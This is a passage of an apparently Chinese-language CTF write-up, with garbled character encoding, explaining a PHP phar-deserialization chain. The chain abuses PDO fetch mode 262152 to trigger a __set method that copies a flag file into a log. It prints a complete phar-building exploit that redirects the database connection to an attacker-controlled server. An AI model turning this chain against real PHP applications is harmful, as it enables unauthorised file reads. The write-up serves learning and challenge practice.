class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filePath</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;filePath;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$value</span>;<br>           <span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/log/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$a</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteMessage</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-comment">// åˆ é™¤ç•™è¨€æ–‡ä»¶</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$msg</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateFileName</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$timestamp</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$timestamp</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-string">&quot;./txt/&quot;</span>.<span class="hljs-variable">$hash</span> . <span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileName</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readMessage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// è¯»å–å¹¶è¿”å›ç•™è¨€æ–‡ä»¶çš„å†…å®¹</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;filePath)) &#123;<br>            <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$message</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æƒ³åˆ°ä»€ä¹ˆè§¦å‘çš„æ–¹æ³•ï¼Œå¦‚æœèƒ½è§¦å‘ä¸”filepathå¯æ§ï¼Œå°±å¯ä»¥ç›´æ¥è¯»å–flagæ–‡ä»¶ç„¶åå†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç„¶åå°±æƒ³èƒ½ä¸èƒ½æ‰“åŸç”Ÿç±»è¯»æ–‡ä»¶ä»€ä¹ˆçš„ï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç›¸å…³çš„æ–¹æ³•ï¼Œæ‰€ä»¥å°±å¡ç€äº†ã€‚</p><p>å”¯ä¸€è§£å°±æ˜¯gxnå¤§å“¥çš„è§£ï¼Œçœ‹äº†gxnå¤§å“¥wpå‘ç°æ˜¯ç”¨PDOæ¥è§¦å‘ï¼Œç„¶åçªç„¶æƒ³èµ·æ¥æˆ‘åœ¨æœç´¢çš„æ—¶å€™ä¹Ÿçœ‹åˆ°ç›¸å…³çš„æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/6699?time__1311=n4+xnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD#toc-3">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD#toc-3</a></p><p>è™½ç„¶è¿™é‡Œä¹Ÿæ˜¯ç”¨PDOçš„ä½†æ˜¯å’Œæœ¬é¢˜çš„è§£æ³•ä¸ä¸€æ ·ï¼Œè¿™ç¯‡æ–‡ç« é‡Œçš„pharæœ‰æœºä¼šä¹Ÿå­¦ä¸€ä¸‹æ°´ç¯‡æ–‡ç« </p><p>æ¥ä¸‹æ¥è¯´è¯´æœ¬é¢˜çš„è§£æ³•ï¼Œè¿™ä¸ªæ€è·¯çœ‹å®Œä¹‹åç¡®å®å¦™ï¼Œæ˜¯æœ¬èœé¸¡æƒ³ä¸å‡ºæ¥çš„æ€è·¯ğŸ˜­</p><p>è¿™é‡Œå…³é”®å°±æ˜¯è§¦å‘__seté­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬çŸ¥é“__setæ–¹æ³•å°±æ˜¯è®¿é—®ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™ä¼šè§¦å‘ï¼Œæˆ‘ä»¬å¯ä»¥å…³æ³¨ä¸€ä¸‹PDO_connect.phpè¿™ä¸ªç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = [];<span class="hljs-comment">//use to set options of PDO connections</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;con_options = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=localhost:3306;dbname=users;charset=utf8&quot;</span>,<br>            <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>            <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br>            <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br>            <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>            <span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>,<br>                PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br>        );<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_connection</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;dsn&#x27;</span>], <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;user&#x27;</span>], <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>])&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>]);<br>            &#125;<br>            <br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>, <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>]);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Connection Error: &#x27;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªoptionï¼Œå¯ä»¥è®¾ç½®ä¸€äº›PDOç›¸å…³çš„é€‰é¡¹ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªé€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PDO::ATTR_DEFAULT_FETCH_MODE<br>PDO::ATTR_ERRMODE<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªé€‰é¡¹å¯ä»¥ç¿»ä¸€ç•ªå®˜æ–¹æ–‡æ¡£çŸ¥é“æ˜¯å¹²ä»€ä¹ˆçš„ï¼š<a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p>ç¬¬äºŒä¸ªæ˜¯è®¾ç½®æŠ¥é”™æ–¹å¼ï¼Œä¸æ˜¯ä»€ä¹ˆé‡ç‚¹å†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241226000208435.png" alt="image-20241226000208435"></p><p>é‡ç‚¹æ˜¯ç¬¬ä¸€ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241226000229404.png" alt="image-20241226000229404"></p><p>ä¹Ÿå°±æ˜¯è®¾ç½®é»˜è®¤è·å–æ•°æ®æ—¶å€™çš„å½¢å¼ï¼Œé‚£å°±æ˜¯å’Œè°ƒç”¨fetchæ–¹æ³•æœ‰å…³ï¼Œè¿™é‡Œå¯ä»¥å†çœ‹ä¸€ä¸‹User.phpçš„æºç </p><p>ç±»é‡Œé¢æœ‰ä¸€ä¸ªlogæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">try</span>&#123;<br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = :username&quot;</span>;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>(<span class="hljs-string">&#x27;:username&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;username);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„fetchæ–¹æ³•æ‰§è¡Œçš„æ˜¯é»˜è®¤è·å–å‚æ•°ï¼Œå…¶ä»–çš„éƒ½æ˜¯å†™æ­»çš„ï¼Œæ¬¸ç„¶åæ€è·¯å°±æ‰“å¼€äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æˆ‘ä»¬å·²çŸ¥çš„pharååºåˆ—åŒ–å»æ”¹å˜è¿™ä¸ªè¿æ¥å±æ€§ï¼Œè‡³äºæ”¹ä»€ä¹ˆå‘¢ï¼Œ<del>æˆ‘ä»¬å¯ä»¥æ”¹æˆä¸‹é¢è¿™ä¸ª262144</del></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * Determine the class name from the value of first column.</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@link</span> https://php.net/manual/en/pdo.constants.php#pdo.constants.fetch-classtype</span><br><span class="hljs-comment">  */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FETCH_CLASSTYPE</span> = <span class="hljs-number">262144</span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç‚¹è¿›æºç ç¿»å°±å¯ä»¥ç¿»åˆ°è¿™ä¸ªå±æ€§ï¼Œè¯¥å±æ€§çš„æ„æ€å°±æ˜¯æ ¹æ®ç¬¬ä¸€åˆ—çš„å€¼æ¥ç¡®å®šç±»å</p><blockquote><p>å…·ä½“æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æˆ‘ä»¬fetchè¿”å›çš„æ—¶å€™ï¼ŒPDO ä¼šæ£€æŸ¥ç»“æœé›†çš„ç¬¬ä¸€åˆ—ï¼Œå¹¶å°†è¯¥åˆ—çš„å€¼ä½œä¸ºç±»åæ¥åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœè¯¥åˆ—çš„å€¼ä¸ºå­—ç¬¦ä¸² â€œclassnameâ€ï¼Œåˆ™ PDO ä¼šå°è¯•å®ä¾‹åŒ–ä¸€ä¸ªåä¸º â€œclassnameâ€ çš„ç±»çš„å¯¹è±¡ã€‚</p><p><del>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸€ç‚¹ï¼Œä»–ä¼šå°†å…¶ä½™çš„åˆ—åè®¾ç½®ä¸ºè¯¥å¯¹è±¡çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨åˆå§‹åŒ–ä¸”è®¿é—®å±æ€§å¹¶èµ‹å€¼äº†</del>è¿™é‡Œæœ‰é—®é¢˜åé¢è¯´ğŸ¥²</p><p>è¿™é‡Œè¿˜é‡æ–°è°ƒç”¨äº†ä¸€éget_connectionæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¹Ÿç¡®å®šæ˜¯æˆ‘ä»¬çš„å…¥å£ç±»äº†</p></blockquote><p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡pharä¿®æ”¹PDO_connectçš„é…ç½®ï¼Œè®©ä»–è¿æ¥æˆ‘ä»¬è‡ªå·±çš„è¿œç¨‹æ•°æ®åº“ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­˜åœ¨çš„å¯¹è±¡ï¼Œä½†æ˜¯åˆ—åæ˜¯ä¸å­˜åœ¨çš„å±æ€§ï¼Œä»è€Œå¯ä»¥è§¦å‘æˆ‘ä»¬çš„_setæ–¹æ³•</p><p>æˆ‘ä»¬æœ¬åœ°å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;setup!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=localhost:3306;dbname=test;charset=utf8&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-comment">// $conn-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_CLASSTYPE);</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>, PDO::<span class="hljs-variable constant_">FETCH_CLASS</span> | PDO::<span class="hljs-variable constant_">FETCH_CLASSTYPE</span>);<br><span class="hljs-comment">// $conn-&gt;setAttribute(PDO::ATTR_CLASSTYPE, &#x27;Test&#x27;);</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM das&quot;</span>;<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>    <br><span class="hljs-comment">// æ‰§è¡ŒæŸ¥è¯¢</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <br><span class="hljs-comment">// è·å–ç»“æœ</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br><br></code></pre></td></tr></table></figure><p>è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241226212228136.png" alt="image-20241226212228136"></p><p>æœ€åçš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241226212501441.png" alt="image-20241226212501441"></p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯gxnå¤§å“¥çš„æ•°å­—å†™é”™äº†ï¼Œå› ä¸º<code>FETCH_CLASSTYPE</code>çš„æ•°å­—å¹¶ä¸æ˜¯262152ï¼Œç„¶åæˆ‘å°±åªè®¾ç½®äº†FETCH_CLASSTYPEè¿™ä¸ªå±æ€§ï¼Œä½†æ˜¯å‘ç°ä»–ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PDOException: SQLSTATE[HY000]: General error: PDO::FETCH_CLASSTYPE can only be used together with PDO::FETCH_CLASS<br></code></pre></td></tr></table></figure><p>è¯´è¿˜éœ€è¦é…åˆ<code>FETCH_CLASS</code>ä½¿ç”¨ï¼Œç„¶åå†å»æ‰¾ä¸€ä¸‹è¿™ä¸ªå±æ€§</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Specifies that the fetch method shall return a new instance of the</span><br><span class="hljs-comment">     * requested class, mapping the columns to named properties in the class.</span><br><span class="hljs-comment">     * The magic</span><br><span class="hljs-comment">     * &lt;b&gt;__set&lt;/b&gt;</span><br><span class="hljs-comment">     * method is called if the property doesn&#x27;t exist in the requested class</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@link</span> https://php.net/manual/en/pdo.constants.php#pdo.constants.fetch-class</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FETCH_CLASS</span> = <span class="hljs-number">8</span>;<br></code></pre></td></tr></table></figure><p>å¤§ä½“æ„æ€å°±æ˜¯è¯´ï¼Œfetchæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ï¼Œç„¶åå°†åˆ—æ˜ å°„åˆ°å‘½åå±æ€§ä¸Šé¢ï¼Œå¦‚æœè¯·æ±‚çš„ç±»ä¸å­˜åœ¨è¯¥å±æ€§ï¼Œåˆ™è°ƒç”¨__setæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªæ‰æ˜¯æœ€å…³é”®çš„å±æ€§ï¼Œç„¶åFETCH_CLASSTYPEç›¸å½“äºæŒ‡å®šäº†ç±»çš„åå­—ï¼Œæœ‰ç‚¹ç±»ä¼¼è¿‡æ»¤å™¨çš„æ„æ€äº†ï¼Œç„¶åä»–ä»¬ä¸¤ä¸ªçš„å€¼æˆ–å‡ºæ¥ 8 | 262144 &#x3D; 262152ï¼Œåˆšå¥½å°±æ˜¯262152ã€‚ï¼ˆè¿™é‡Œçœ‹äº†æˆ‘åŠå¤©çœŸçš„ğŸ˜­ï¼‰</p><p>æ‰€ä»¥è¿™ä¹ˆå†™ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>,<span class="hljs-number">262152</span>);<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬è¿™é‡Œå°±æ˜¯å¯ä»¥ç„¶åæ•°æ®åº“è¿”å›UserMessageå¯¹è±¡ï¼Œè®¾ç½®filePathçš„å€¼ï¼Œå†æ·»åŠ ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§å³å¯ï¼Œæ•°æ®åº“çš„ç»“æ„å¦‚ä¸‹ï¼Œç›´æ¥å·gxnå¤§å“¥çš„å›¾äº†</p><p><img src="https://cdn.clown2024.cn/image-20241226214745079.png" alt="image-20241226214745079"></p><p>æœ€åçš„expå°±æ˜¯gxnå¤§å“¥çš„exp</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UserMessage&quot;</span>;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;aaaa&quot;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$created_at</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>     <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();;<br><br>  &#125;<br><br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span>&#123;<br><br><br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = <span class="hljs-keyword">array</span>(<br><br>     <span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=&lt;vps&gt;:3306;dbname=&lt;dbname&gt;;charset=utf8&quot;</span>,<br><br>     <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;&lt;vps&gt;&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br><br>      <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="hljs-number">262152</span>,<br><br>       PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br><br>  );<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;ppppp.phar&quot;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;happy.txt&quot;</span>, <span class="hljs-string">&#x27;happy&#x27;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-variable">$file_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;ppppp.phar&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_contents</span>));<br></code></pre></td></tr></table></figure><p>è¿™é‡Œbuué¶æœºç»´æŠ¤äº†ï¼Œæœ¬åœ°ä¸å¤ªå¥½æµ‹ï¼Œä½†æ‰“æ³•å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå°±åˆ°è¿™å§ï¼Œå­¦ä¹ åˆ°äº†orz</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p><a href="https://xz.aliyun.com/t/6699?time__1311=n4+xnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD</a></p>]]></content>
    
    
      
      
